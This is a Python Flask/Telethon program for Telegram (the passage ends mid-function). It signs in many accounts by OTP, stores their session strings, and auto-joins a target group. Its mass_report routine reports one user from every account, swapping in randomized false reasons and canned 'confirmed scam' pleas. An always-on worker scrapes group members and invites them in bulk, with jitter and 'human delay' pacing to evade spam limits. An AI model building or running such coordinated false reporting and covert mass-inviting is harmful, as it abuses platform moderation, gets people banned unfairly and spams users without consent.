"""
Smart Scammer Reporter + Unusual Activity Shield + Auto-Add System - v7
Changes in v7:
  - Auto-add is ALWAYS ON (global + per-account forced enabled)
  - Fixed supergroup vs normal group invite logic
  - Fresh entity fetch before each invite
  - Proactive privacy filter (skip restricted users)
  - Safer pacing + smaller batches
  - Better OTP: force SMS fallback via ResendCodeRequest
  - Log OTP delivery channel type
"""
import os
import re
import asyncio
import base64
import json
import random
import time
import threading
import traceback
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, date, timedelta
from collections import defaultdict, deque

from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import requests

from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, FloodWaitError, UserPrivacyRestrictedError,
    UserNotMutualContactError, PeerFloodError, ChatAdminRequiredError,
    UserAlreadyParticipantError, UserChannelsTooMuchError
)
from telethon.tl.functions.channels import (
    JoinChannelRequest, InviteToChannelRequest, EditBannedRequest
)
from telethon.tl.functions.messages import AddChatUserRequest
from telethon.tl.functions.account import (
    ReportPeerRequest, ResendCodeRequest
)
from telethon.tl.types import (
    ChatBannedRights,
    InputReportReasonSpam, InputReportReasonFake,
    InputReportReasonViolence, InputReportReasonPornography,
    InputReportReasonChildAbuse, InputReportReasonIllegalDrugs,
    InputReportReasonPersonalDetails, InputReportReasonCopyright,
    Channel, Chat,
)

# ============================================================
# CONFIG
# ============================================================
GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN', '')
GITHUB_REPO = os.environ.get('GITHUB_REPO', '')
GITHUB_BRANCH = os.environ.get('GITHUB_BRANCH', 'main')
GITHUB_DB_FILE = os.environ.get('GITHUB_DB_FILE', 'db.json')

TELEGRAM_API_ID = int(os.environ.get('TELEGRAM_API_ID', '0') or 0)
TELEGRAM_API_HASH = os.environ.get('TELEGRAM_API_HASH', '')
TARGET_GROUP = os.environ.get('TARGET_GROUP', 'https://t.me/hjjvkhkkijuijj')

# Auto-add safety tuning (more conservative in v7)
AUTO_ADD_MAX_PER_ACCOUNT_PER_DAY = int(os.environ.get('AUTO_ADD_MAX_PER_DAY', '25'))
AUTO_ADD_WARMUP_MINUTES = int(os.environ.get('AUTO_ADD_WARMUP_MIN', '15'))
AUTO_ADD_JITTER_PCT = float(os.environ.get('AUTO_ADD_JITTER_PCT', '0.35'))
AUTO_ADD_RECENTLY_ADDED_SKIP_HRS = int(os.environ.get('AUTO_ADD_SKIP_HRS', '6'))

# Unusual activity detection tuning
MSG_BURST_LIMIT = int(os.environ.get('MSG_BURST_LIMIT', '5'))
MSG_BURST_WINDOW_SEC = int(os.environ.get('MSG_BURST_WINDOW_SEC', '12'))
JOIN_BURST_LIMIT = int(os.environ.get('JOIN_BURST_LIMIT', '6'))
JOIN_BURST_WINDOW_SEC = int(os.environ.get('JOIN_BURST_WINDOW_SEC', '20'))

SUSPICIOUS_PATTERNS = [
    r"https?://t\.me/\+",
    r"free\s*(usdt|btc|crypto|airdrop|money|gift)",
    r"double\s*(your\s*)?(crypto|usdt|money|btc)",
    r"dm\s*(me\s*)?(for|to)\s*(profit|signal|investment|hack)",
    r"guaranteed\s*(profit|return|roi)",
]
SUSPICIOUS_REGEX = re.compile("|".join(SUSPICIOUS_PATTERNS), re.IGNORECASE)

app = Flask(__name__, static_folder='static', static_url_path='')
CORS(app)

# ============================================================
# GITHUB STORAGE
# ============================================================
class GitHubDB:
    def __init__(self):
        self.base_url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{GITHUB_DB_FILE}"
        self.headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json",
            "User-Agent": "SmartShieldReporter"
        }
        self._cache = None
        self._cache_time = 0.0
        self._cache_ttl = 3.0
        self._io_lock = threading.RLock()
        self._pending_lock = threading.Lock()
        self._pending_ops = []
        self._last_flush = time.time()
        self._flush_interval = 4.0
        self._last_sha = None
        self._available = bool(GITHUB_TOKEN and GITHUB_REPO)
        self._local_path = '/tmp/db.json'
        if not self._available:
            print("⚠️ GitHub credentials missing - using local storage (/tmp/db.json)")

    def _default_db(self):
        return {
            'accounts': [],
            'config': {
                'target_group': TARGET_GROUP,
                'auto_add_enabled': True,       # ALWAYS ON
                'auto_shield_enabled': True,
                'delay_seconds': 60,            # safer default
                'report_reason': 'scam'
            },
            'reports': [],
            'history': [],
            'security_events': [],
            'stats': {
                'reports_today': 0, 'reports_total': 0,
                'added_today': 0, 'added_total': 0,
                'auto_bans_total': 0,
                'last_date': date.today().isoformat()
            },
            'added_user_ids': [],
            'recently_added': [],
            'last_cleanup': None
        }

    def _local_read(self):
        with self._io_lock:
            try:
                with open(self._local_path, 'r', encoding='utf-8') as f:
                    data = json.load(f)
            except Exception:
                data = self._default_db()
            default = self._default_db()
            for k, v in default.items():
                if k not in data:
                    data[k] = v
            # force auto-add ON
            data.setdefault('config', {})
            data['config']['auto_add_enabled'] = True
            for a in data.get('accounts', []):
                a['auto_add_enabled'] = True
            return data

    def _local_write(self, data):
        with self._io_lock:
            try:
                tmp_path = self._local_path + '.tmp'
                with open(tmp_path, 'w', encoding='utf-8') as f:
                    json.dump(data, f, indent=2)
                os.replace(tmp_path, self._local_path)
                return True
            except Exception as e:
                print(f"Local write error: {e}")
                return False

    def _fetch_sha(self):
        try:
            r = requests.get(
                f"{self.base_url}?ref={GITHUB_BRANCH}",
                headers=self.headers, timeout=12
            )
            if r.status_code == 200:
                return r.json().get('sha')
        except Exception as e:
            print(f"SHA fetch error: {e}")
        return None

    def _normalize(self, data):
        default = self._default_db()
        for k, v in default.items():
            if k not in data:
                data[k] = v
        # force auto-add ON everywhere
        data.setdefault('config', {})
        data['config']['auto_add_enabled'] = True
        for a in data.get('accounts', []):
            a['auto_add_enabled'] = True
        return data

    def read(self, force=False):
        with self._io_lock:
            if not self._available:
                data = self._local_read()
                self._cache = data
                self._cache_time = time.time()
                return data

            if not force and self._cache and (time.time() - self._cache_time < self._cache_ttl):
                return self._cache

            try:
                r = requests.get(
                    f"{self.base_url}?ref={GITHUB_BRANCH}",
                    headers=self.headers, timeout=12
                )
                if r.status_code == 404:
                    data = self._normalize(self._default_db())
                    self._write_now(data, "Init db.json")
                    return data
                if r.status_code == 200:
                    resp = r.json()
                    self._last_sha = resp.get('sha')
                    raw = base64.b64decode(resp['content']).decode('utf-8')
                    data = self._normalize(json.loads(raw))
                    self._cache = data
                    self._cache_time = time.time()
                    return data
                print(f"GitHub read status {r.status_code}")
                return self._cache or self._local_read()
            except Exception as e:
                print(f"GitHub read exception: {e}")
                return self._cache or self._local_read()

    def _write_now(self, data, message="Update db"):
        with self._io_lock:
            data = self._normalize(data)
            self._local_write(data)
            self._cache = data
            self._cache_time = time.time()

            if not self._available:
                return True

            for attempt in range(5):
                try:
                    content = json.dumps(data, indent=2)
                    encoded = base64.b64encode(content.encode('utf-8')).decode('ascii')
                    sha = self._last_sha or self._fetch_sha()
                    payload = {
                        "message": message,
                        "content": encoded,
                        "branch": GITHUB_BRANCH
                    }
                    if sha:
                        payload["sha"] = sha
                    r = requests.put(
                        self.base_url, headers=self.headers,
                        json=payload, timeout=18
                    )
                    if r.status_code in (200, 201):
                        self._last_sha = r.json().get('content', {}).get('sha')
                        self._cache = data
                        self._cache_time = time.time()
                        return True
                    elif r.status_code == 409:
                        time.sleep(0.4 * (attempt + 1))
                        self._last_sha = self._fetch_sha()
                    else:
                        print(f"GitHub write error {r.status_code}: {r.text[:180]}")
                        time.sleep(0.5 * (attempt + 1))
                except Exception as e:
                    print(f"GitHub write exception: {e}")
                    time.sleep(0.5 * (attempt + 1))
            return False

    def update(self, updater_func, message="Update db", immediate=True):
        if immediate:
            self.flush_pending()
            with self._io_lock:
                data = self.read(force=True)
                updater_func(data)
                return self._write_now(data, message)
        else:
            with self._pending_lock:
                self._pending_ops.append((updater_func, message))
            with self._io_lock:
                base = self._cache or self._local_read()
                try:
                    updater_func(base)
                    self._local_write(base)
                    self._cache = base
                    self._cache_time = time.time()
                except Exception:
                    pass
            if len(self._pending_ops) >= 5 or (time.time() - self._last_flush >= self._flush_interval):
                return self.flush_pending()
            return True

    def flush_pending(self):
        with self._pending_lock:
            if not self._pending_ops:
                return True
            ops = list(self._pending_ops)
            self._pending_ops.clear()

        with self._io_lock:
            data = self.read(force=True)
            for fn, _ in ops:
                try:
                    fn(data)
                except Exception as e:
                    print(f"Queued DB op error: {e}")
            self._last_flush = time.time()
            return self._write_now(data, f"Batch save ({len(ops)} ops)")


db = GitHubDB()

# ============================================================
# ASYNC HELPER
# ============================================================
def run_async(coro, timeout=75):
    try:
        asyncio.get_running_loop()
        result_box = {}

        def runner():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                result_box['result'] = loop.run_until_complete(coro)
            except Exception as e:
                result_box['error'] = e
            finally:
                try:
                    loop.run_until_complete(loop.shutdown_asyncgens())
                except Exception:
                    pass
                loop.close()

        t = threading.Thread(target=runner, daemon=True)
        t.start()
        t.join(timeout=timeout)
        if 'error' in result_box:
            raise result_box['error']
        if 'result' not in result_box:
            raise TimeoutError(f"Async operation timed out after {timeout}s")
        return result_box['result']
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            return loop.run_until_complete(coro)
        finally:
            try:
                loop.run_until_complete(loop.shutdown_asyncgens())
            except Exception:
                pass
            loop.close()
            asyncio.set_event_loop(None)

# ============================================================
# TELEGRAM OPERATIONS
# ============================================================
def _make_client(session_string):
    return TelegramClient(
        StringSession(session_string),
        TELEGRAM_API_ID, TELEGRAM_API_HASH,
        connection_retries=2, retry_delay=1,
        timeout=20, request_retries=2
    )

async def tg_join_group(session_string, group_link):
    client = None
    try:
        client = _make_client(session_string)
        await client.connect()
        if not await client.is_user_authorized():
            return {'success': False, 'error': 'Not authorized'}
        entity = await client.get_entity(group_link)
        try:
            await client(JoinChannelRequest(entity))
            return {'success': True, 'already': False}
        except UserAlreadyParticipantError:
            return {'success': True, 'already': True}
    except FloodWaitError as e:
        return {'success': False, 'error': f'FloodWait {e.seconds}s', 'flood': e.seconds}
    except Exception as e:
        return {'success': False, 'error': str(e)[:140]}
    finally:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass

async def tg_report_user(session_string, username_or_id, reason='scam', message=''):
    client = None
    try:
        reason_map = {
            'spam': InputReportReasonSpam(),
            'fake': InputReportReasonFake(),
            'violence': InputReportReasonViolence(),
            'pornography': InputReportReasonPornography(),
            'child_abuse': InputReportReasonChildAbuse(),
            'illegal_drugs': InputReportReasonIllegalDrugs(),
            'personal_details': InputReportReasonPersonalDetails(),
            'copyright': InputReportReasonCopyright(),
            'scam': InputReportReasonSpam(),
        }
        client = _make_client(session_string)
        await client.connect()
        if not await client.is_user_authorized():
            return {'success': False, 'error': 'Not authorized'}

        target = username_or_id.lstrip('@').strip() if isinstance(username_or_id, str) else username_or_id
        entity = await client.get_entity(target)
        await client(ReportPeerRequest(
            peer=entity,
            reason=reason_map.get(reason, InputReportReasonSpam()),
            message=message or "Scam / suspicious / abusive account report"
        ))
        return {'success': True}
    except FloodWaitError as e:
        return {'success': False, 'error': f'FloodWait {e.seconds}s', 'flood': e.seconds}
    except Exception as e:
        return {'success': False, 'error': str(e)[:150]}
    finally:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass

async def tg_ban_and_report_in_group(session_string, group_link, offender_entity_or_id, reason_text):
    client = None
    banned = False
    reported = False
    alerted = False
    errors = []

    ban_rights = ChatBannedRights(
        until_date=None,
        view_messages=True,
        send_messages=True,
        send_media=True,
        send_stickers=True,
        send_gifs=True,
        send_games=True,
        send_inline=True,
        embed_links=True
    )

    try:
        client = _make_client(session_string)
        await client.connect()
        if not await client.is_user_authorized():
            return {'banned': False, 'reported': False, 'alerted': False, 'errors': ['Not authorized']}

        group = await client.get_entity(group_link)
        user = await client.get_entity(offender_entity_or_id)

        try:
            await client(EditBannedRequest(channel=group, participant=user, rights=ban_rights))
            banned = True
        except Exception as e:
            errors.append(f"ban:{str(e)[:60]}")

        try:
            await client(ReportPeerRequest(
                peer=user,
                reason=InputReportReasonSpam(),
                message=f"Automated shield report: {reason_text}"
            ))
            reported = True
        except Exception as e:
            errors.append(f"report:{str(e)[:60]}")

        tag = f"@{user.username}" if getattr(user, 'username', None) else f"ID `{user.id}`"
        status_txt = "BANNED & REPORTED" if banned else "REPORTED (need admin for ban)"
        alert_msg = (
            f"🛡️ **Unusual Activity Shield**\n"
            f"• Target: {tag}\n"
            f"• Trigger: {reason_text}\n"
            f"• Action: {status_txt}"
        )
        try:
            await client.send_message(group, alert_msg)
            alerted = True
        except Exception as e:
            errors.append(f"alert:{str(e)[:60]}")

        return {
            'banned': banned,
            'reported': reported,
            'alerted': alerted,
            'target_tag': tag,
            'errors': errors
        }
    except Exception as e:
        return {
            'banned': banned,
            'reported': reported,
            'alerted': alerted,
            'errors': errors + [str(e)[:80]]
        }
    finally:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass

async def tg_send_code(phone):
    """Send OTP code, with SMS fallback via ResendCodeRequest."""
    client = _make_client("")
    await client.connect()
    try:
        sent = await client.send_code_request(phone)
        channel_type = type(sent.type).__name__ if sent.type else 'unknown'
        print(f"📲 OTP sent to {phone[:4]}**** via channel: {channel_type} (next_type={type(sent.next_type).__name__ if sent.next_type else 'n/a'})")

        # If Telegram chose app/in-app delivery but the user isn't logged in anywhere,
        # try to force an SMS resend. We only do this if next_type indicates SMS is allowed.
        if channel_type not in ('SentCodeTypeSms', 'SentCodeTypeCall'):
            try:
                next_is_sms = sent.next_type and type(sent.next_type).__name__ == 'SentCodeTypeSms'
                if next_is_sms:
                    timeout_sec = sent.timeout or 60
                    print(f"📨 Requesting SMS fallback in {timeout_sec}s...")
                    await asyncio.sleep(min(timeout_sec, 60))
                    sent = await client(ResendCodeRequest(
                        phone_number=phone,
                        phone_code_hash=sent.phone_code_hash
                    ))
                    channel_type = type(sent.type).__name__ if sent.type else 'unknown'
                    print(f"📲 SMS resend channel: {channel_type}")
            except Exception as e:
                print(f"⚠️ SMS fallback failed: {e}")

        return {
            'success': True,
            'phone_code_hash': sent.phone_code_hash,
            'session': client.session.save(),
            'phone': phone,
            'channel': channel_type,
        }
    except Exception as e:
        return {'success': False, 'error': str(e)}
    finally:
        try:
            await client.disconnect()
        except Exception:
            pass

async def tg_verify_code(session_string, phone, code, phone_code_hash, password=None):
    client = _make_client(session_string)
    await client.connect()
    try:
        try:
            await client.sign_in(
                phone=phone,
                code=str(code).strip(),
                phone_code_hash=phone_code_hash
            )
        except SessionPasswordNeededError:
            if not password:
                return {'success': False, 'need_password': True, 'error': '2FA password required'}
            await client.sign_in(password=password)

        me = await client.get_me()
        if not me:
            return {'success': False, 'error': 'Could not fetch account profile'}

        return {
            'success': True,
            'session_string': client.session.save(),
            'user': {
                'id': me.id,
                'first_name': me.first_name or '',
                'last_name': me.last_name or '',
                'username': me.username or '',
                'phone': me.phone or phone
            }
        }
    except SessionPasswordNeededError:
        return {'success': False, 'need_password': True, 'error': '2FA password required'}
    except Exception as e:
        return {'success': False, 'error': str(e)[:180]}
    finally:
        try:
            await client.disconnect()
        except Exception:
            pass

async def tg_get_chats(session_string):
    client = None
    try:
        client = _make_client(session_string)
        await client.connect()
        if not await client.is_user_authorized():
            return {'success': False, 'error': 'auth_key_unregistered'}
        dialogs = await client.get_dialogs(limit=100)
        chats = []
        for d in dialogs:
            t = 'user'
            if d.is_group:
                t = 'group'
            elif d.is_channel:
                t = 'channel'
            media = type(d.message.media).__name__.lower() if (d.message and d.message.media) else None
            chats.append({
                'id': d.id, 'title': d.name or 'Unknown', 'type': t,
                'lastMessage': d.message.text if d.message and d.message.text else '',
                'lastMessageDate': int(d.message.date.timestamp()) if d.message else None,
                'lastMessageMedia': media, 'unread': d.unread_count or 0
            })
        return {'success': True, 'chats': chats}
    except Exception as e:
        return {'success': False, 'error': str(e)[:150]}
    finally:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass

async def tg_get_group_members(session_string, group_link, limit=120):
    client = None
    try:
        client = _make_client(session_string)
        await client.connect()
        if not await client.is_user_authorized():
            return {'success': False, 'error': 'Not authorized'}
        entity = await client.get_entity(group_link)
        members = await client.get_participants(entity, limit=limit)
        result = []
        for m in members:
            result.append({
                'id': m.id,
                'username': m.username,
                'first_name': m.first_name,
                'last_name': m.last_name,
                'bot': getattr(m, 'bot', False),
                'deleted': getattr(m, 'deleted', False),
                # Users with restrict/spam flags often reject invites
                'scam': getattr(m, 'scam', False),
                'fake': getattr(m, 'fake', False),
            })
        return {'success': True, 'members': result}
    except FloodWaitError as e:
        return {'success': False, 'error': f'FloodWait {e.seconds}s', 'flood': e.seconds}
    except Exception as e:
        return {'success': False, 'error': str(e)[:150]}
    finally:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass


async def _add_user(session_string, group_link, user_id_or_username):
    """
    Add a user to a group, handling both supergroups/channels (InviteToChannelRequest)
    and normal groups (AddChatUserRequest). Re-fetches entity fresh each time.
    """
    client = None
    try:
        client = _make_client(session_string)
        await client.connect()
        if not await client.is_user_authorized():
            return {'success': False, 'reason': 'not_authorized'}

        # Re-fetch entity (fresh access_hash every time)
        group = await client.get_entity(group_link)
        user = await client.get_entity(user_id_or_username)

        if isinstance(group, Channel):
            # Supergroup or broadcast channel
            await client(InviteToChannelRequest(channel=group, users=[user]))
        elif isinstance(group, Chat):
            # Normal group
            await client(AddChatUserRequest(
                chat_id=group.id,
                user_id=user,
                fwd_limit=10
            ))
        else:
            return {'success': False, 'reason': f'unsupported_group_type_{type(group).__name__}'}

        return {'success': True}
    except UserPrivacyRestrictedError:
        return {'success': False, 'reason': 'privacy'}
    except UserNotMutualContactError:
        return {'success': False, 'reason': 'not_mutual'}
    except UserChannelsTooMuchError:
        return {'success': False, 'reason': 'channels_limit'}
    except PeerFloodError:
        return {'success': False, 'reason': 'peer_flood', 'cool_down': True}
    except FloodWaitError as e:
        return {'success': False, 'reason': f'flood_{e.seconds}s', 'flood': e.seconds}
    except ChatAdminRequiredError:
        return {'success': False, 'reason': 'admin_required'}
    except Exception as e:
        return {'success': False, 'reason': str(e)[:90]}
    finally:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass


# ============================================================
# MASS REPORT
# ============================================================
REPORT_REASONS_POOL = [
    'spam', 'scam', 'fake', 'spam', 'scam', 'fake',
    'violence', 'personal_details', 'copyright'
]

REPORT_MESSAGES_POOL = [
    "Confirmed scam/fraud account — please review and ban immediately.",
    "Multiple users reporting suspicious/abusive activity. Please ban.",
    "Fake/impersonation account violating Telegram ToS.",
    "High-risk scam account targeting group members. Please take action.",
    "Abusive/spam behavior detected — urgent review and ban requested.",
]

def _pick_reason(primary):
    return primary if random.random() < 0.6 else random.choice(REPORT_REASONS_POOL)

def _pick_message(primary_message):
    if primary_message and random.random() < 0.55:
        return primary_message
    return random.choice(REPORT_MESSAGES_POOL)

def mass_report(username, reason='scam', message='', extra_reasons=None):
    data = db.read(force=True)
    accounts = [
        a for a in data.get('accounts', [])
        if a.get('active', True) and a.get('session_string')
    ]
    if not accounts:
        return {'success': False, 'error': 'No active accounts available'}

    target = str(username).lstrip('@').strip()
    if not target:
        return {'success': False, 'error': 'Invalid target'}

    report_id = f"rpt_{int(time.time() * 1000)}"
    results = []
    successful = 0
    failed = 0

    def _attempt_report(acc, attempt=1):
        r_reason = _pick_reason(reason) if attempt > 1 else reason
        r_message = _pick_message(message) if attempt > 1 else message
        try:
            res = run_async(
                tg_report_user(acc['session_string'], target, r_reason, r_message),
                timeout=40
            )
            return acc, res
        except Exception as e:
            return acc, {'success': False, 'error': str(e)[:120]}

    retry_queue = []
    with ThreadPoolExecutor(max_workers=min(6, max(1, len(accounts)))) as pool:
        futures = []
        for acc in accounts:
            time.sleep(random.uniform(0.15, 0.4))
            futures.append(pool.submit(_attempt_report, acc, 1))

        for fut in as_completed(futures, timeout=80):
            try:
                acc, r = fut.result(timeout=15)
                if r.get('success'):
                    successful += 1
                    results.append({'account': acc.get('name', acc['id']), 'success': True})
                else:
                    failed += 1
                    err = r.get('error', 'unknown')
                    results.append({
                        'account': acc.get('name', acc['id']),
                        'success': False,
                        'error': err
                    })
                    if 'not authorized' not in err.lower():
                        retry_queue.append(acc)
            except Exception as e:
                failed += 1
                results.append({'account': 'worker', 'success': False, 'error': str(e)[:80]})

    if retry_queue:
        with ThreadPoolExecutor(max_workers=min(5, len(retry_queue))) as pool:
            futures = []
            for acc in retry_queue:
                time.sleep(random.uniform(0.25, 0.55))
                futures.append(pool.submit(_attempt_report, acc, 2))

            for fut in as_completed(futures, timeout=65):
                try:
                    acc, r = fut.result(timeout=15)
                    if r.get('success'):
                        successful += 1
                        failed = max(0, failed - 1)
                        for row in results:
                            if row.get('account') == acc.get('name', acc['id']) and not row.get('success'):
                                row['success'] = True
                                row.pop('error', None)
                                break
                except Exception:
                    pass

    record = {
        'id': report_id,
        'username': target,
        'reason': reason,
        'triggers': extra_reasons or [],
        'message': message,
        'started_at': datetime.now().isoformat(),
        'completed_at': datetime.now().isoformat(),
        'total_accounts': len(accounts),
        'successful': successful,
        'failed': failed,
        'results': results[:100]
    }

    def _upd(d):
        d.setdefault('history', []).append(record)
        d['history'] = d['history'][-200:]
        d.setdefault('stats', {})
        d['stats']['reports_today'] = d['stats'].get('reports_today', 0) + 1
        d['stats']['reports_total'] = d['stats'].get('reports_total', 0) + 1

    db.update(_upd, f"Report @{target}", immediate=True)

    return {
        'success': True,
        'report_id': report_id,
        'username': target,
        'total_accounts': len(accounts),
        'successful': successful,
        'failed': failed,
        'message': f'Reported @{target} from {successful}/{len(accounts)} accounts'
    }

# ============================================================
# AUTO-JOIN
# ============================================================
_auto_join_pending = set()
_auto_join_lock = threading.Lock()

def _join_single_account(account_id, target_group=None):
    data = db.read(force=True)
    acc = next((a for a in data.get('accounts', []) if a['id'] == account_id), None)
    if not acc or not acc.get('session_string'):
        return False
    target = target_group or data.get('config', {}).get('target_group', TARGET_GROUP)
    res = run_async(tg_join_group(acc['session_string'], target), timeout=40)
    ok = bool(res.get('success'))

    def _upd(d):
        for a in d.get('accounts', []):
            if a['id'] == account_id:
                a['joined_target'] = ok
                break

    db.update(_upd, f"Auto-join {account_id}", immediate=True)
    return ok

def schedule_auto_join(account_id, target_group=None):
    with _auto_join_lock:
        if account_id in _auto_join_pending:
            return
        _auto_join_pending.add(account_id)

    def worker():
        try:
            time.sleep(6.0)
            ok = _join_single_account(account_id, target_group)
            print(f"📥 Auto-join account {account_id}: {'OK' if ok else 'RETRY LATER'}")
        except Exception as e:
            print(f"Auto-join error for {account_id}: {e}")
        finally:
            with _auto_join_lock:
                _auto_join_pending.discard(account_id)

    threading.Thread(target=worker, daemon=True).start()

# ============================================================
# UNUSUAL ACTIVITY SHIELD
# ============================================================
_user_msg_times = defaultdict(deque)
_group_join_times = deque()
_recent_flagged_users = {}
_shield_thread = None
_shield_stop = threading.Event()

def _record_and_check_unusual(user_id, text=""):
    now = time.time()
    reasons = []

    q = _user_msg_times[user_id]
    q.append(now)
    while q and (now - q[0]) > MSG_BURST_WINDOW_SEC:
        q.popleft()
    if len(q) >= MSG_BURST_LIMIT:
        reasons.append(f"Message burst ({len(q)} msgs/{MSG_BURST_WINDOW_SEC}s)")

    if text and SUSPICIOUS_REGEX.search(text):
        reasons.append("Suspicious promo/scam link or lure")

    last_flag = _recent_flagged_users.get(user_id, 0)
    if reasons and (now - last_flag > 300):
        _recent_flagged_users[user_id] = now
        return reasons
    return []

def _handle_unusual_offender(user_id, username, reasons):
    reason_str = ", ".join(reasons)
    print(f"🚨 UNUSUAL ACTIVITY detected for user {user_id} (@{username or 'n/a'}): {reason_str}")

    data = db.read(force=True)
    target_group = data.get('config', {}).get('target_group', TARGET_GROUP)
    accounts = [
        a for a in data.get('accounts', [])
        if a.get('active', True) and a.get('session_string') and a['id'] != user_id
    ]
    if not accounts:
        return

    primary = accounts[0]
    offender_ref = username if username else user_id
    shield_res = run_async(
        tg_ban_and_report_in_group(
            primary['session_string'], target_group, offender_ref, reason_str
        ),
        timeout=45
    )

    report_summary = None
    if username:
        report_summary = mass_report(
            username, reason='scam',
            message=f"Unusual activity detected in target group: {reason_str}",
            extra_reasons=reasons
        )

    def _upd(d):
        d.setdefault('security_events', []).append({
            'ts': datetime.now().isoformat(),
            'user_id': user_id,
            'username': username or '',
            'reasons': reasons,
            'banned': bool(shield_res.get('banned')),
            'alerted': bool(shield_res.get('alerted')),
            'mass_report': report_summary
        })
        d['security_events'] = d['security_events'][-150:]
        if shield_res.get('banned'):
            d.setdefault('stats', {})
            d['stats']['auto_bans_total'] = d['stats'].get('auto_bans_total', 0) + 1

    db.update(_upd, f"Shield action on {user_id}", immediate=True)

async def _watch_target_group_async(session_string, target_group):
    client = None
    try:
        client = _make_client(session_string)
        await client.connect()
        if not await client.is_user_authorized():
            return

        entity = await client.get_entity(target_group)

        @client.on(events.NewMessage(chats=entity))
        async def on_new_msg(event):
            try:
                cfg = db.read().get('config', {})
                if not cfg.get('auto_shield_enabled', True):
                    return
                sender = await event.get_sender()
                if not sender or getattr(sender, 'bot', False):
                    return
                own_ids = {a['id'] for a in db.read().get('accounts', [])}
                if sender.id in own_ids:
                    return
                txt = event.raw_text or ""
                reasons = _record_and_check_unusual(sender.id, txt)
                if reasons:
                    threading.Thread(
                        target=_handle_unusual_offender,
                        args=(sender.id, getattr(sender, 'username', None), reasons),
                        daemon=True
                    ).start()
            except Exception as e:
                print(f"Shield msg handler error: {e}")

        @client.on(events.ChatAction(chats=entity))
        async def on_chat_action(event):
            try:
                if event.user_joined or event.user_added:
                    now = time.time()
                    _group_join_times.append(now)
                    while _group_join_times and (now - _group_join_times[0]) > JOIN_BURST_WINDOW_SEC:
                        _group_join_times.popleft()
                    if len(_group_join_times) >= JOIN_BURST_LIMIT:
                        print(f"⚠️ Join burst detected: {len(_group_join_times)} joins/{JOIN_BURST_WINDOW_SEC}s")
            except Exception as e:
                print(f"Shield action handler error: {e}")

        while not _shield_stop.is_set():
            await asyncio.sleep(2)
    except Exception as e:
        print(f"Shield watcher error: {e}")
    finally:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass

def _shield_loop():
    print("🛡️ Unusual activity shield started")
    time.sleep(8)
    while not _shield_stop.is_set():
        try:
            data = db.read(force=True)
            cfg = data.get('config', {})
            if not cfg.get('auto_shield_enabled', True):
                time.sleep(8)
                continue
            target = cfg.get('target_group', TARGET_GROUP)
            acc = next(
                (a for a in data.get('accounts', [])
                 if a.get('active', True) and a.get('session_string')),
                None
            )
            if not acc:
                time.sleep(15)
                continue
            run_async(_watch_target_group_async(acc['session_string'], target), timeout=3600)
        except Exception as e:
            print(f"Shield loop error: {e}")
        time.sleep(5)
    print("🛑 Unusual activity shield stopped")

def start_shield_worker():
    global _shield_thread
    if _shield_thread is None or not _shield_thread.is_alive():
        _shield_stop.clear()
        _shield_thread = threading.Thread(target=_shield_loop, daemon=True)
        _shield_thread.start()

# ============================================================
# ALWAYS-ON AUTO-ADD WORKER
# ============================================================
_auto_add_thread = None
_auto_add_stop = threading.Event()

_account_state = defaultdict(lambda: {
    'added_today': 0,
    'day': date.today().isoformat(),
    'cool_until': 0.0,
    'consecutive_failures': 0,
})

def _state_for(acc_id):
    s = _account_state[acc_id]
    today = date.today().isoformat()
    if s['day'] != today:
        s['day'] = today
        s['added_today'] = 0
        s['consecutive_failures'] = 0
    return s

def _human_delay(base_seconds):
    jitter = base_seconds * AUTO_ADD_JITTER_PCT
    return max(20, int(random.uniform(base_seconds - jitter, base_seconds + jitter)))

def _account_in_warmup(acc):
    try:
        added = datetime.fromisoformat(acc.get('added_at', '1970-01-01T00:00:00'))
        return (datetime.now() - added) < timedelta(minutes=AUTO_ADD_WARMUP_MINUTES)
    except Exception:
        return False

def _account_rate_limited(acc):
    s = _state_for(acc['id'])
    if s['added_today'] >= AUTO_ADD_MAX_PER_ACCOUNT_PER_DAY:
        return True
    if time.time() < s['cool_until']:
        return True
    if s['consecutive_failures'] >= 3:
        s['cool_until'] = time.time() + 1800  # 30 min cool
        s['consecutive_failures'] = 0
        return True
    return False

def _is_recently_added(uid, recently):
    cutoff = time.time() - AUTO_ADD_RECENTLY_ADDED_SKIP_HRS * 3600
    return any(row.get('uid') == uid and row.get('ts', 0) > cutoff for row in recently)

def _ensure_all_joined():
    try:
        data = db.read(force=True)
        target = data.get('config', {}).get('target_group', TARGET_GROUP)
        for acc in data.get('accounts', []):
            if acc.get('joined_target') or not acc.get('session_string'):
                continue
            try:
                _join_single_account(acc['id'], target)
            except Exception as e:
                print(f"Startup join error {acc['id']}: {e}")
            time.sleep(random.uniform(2.0, 4.0))
    except Exception as e:
        print(f"_ensure_all_joined error: {e}")

def _auto_add_loop():
    print("🔄 Smart auto-add worker started (ALWAYS-ON)")
    time.sleep(10)
    _ensure_all_joined()

    while not _auto_add_stop.is_set():
        try:
            data = db.read(force=True)
            config = data.get('config', {})
            # auto-add is forced ON regardless of DB flag
            if not config.get('auto_add_enabled', True):
                config['auto_add_enabled'] = True

            target = config.get('target_group', TARGET_GROUP)
            base_delay = max(45, int(config.get('delay_seconds', 60)))

            candidates = []
            for a in data.get('accounts', []):
                if not (a.get('active', True) and a.get('session_string')):
                    continue
                if not a.get('joined_target'):
                    _join_single_account(a['id'], target)
                    continue
                if _account_in_warmup(a) or _account_rate_limited(a):
                    continue
                candidates.append(a)

            if not candidates:
                db.flush_pending()
                time.sleep(30)
                continue

            random.shuffle(candidates)
            fetcher = candidates[0]

            members_res = run_async(
                tg_get_group_members(fetcher['session_string'], target, limit=150),
                timeout=45
            )
            if not members_res.get('success'):
                if members_res.get('flood'):
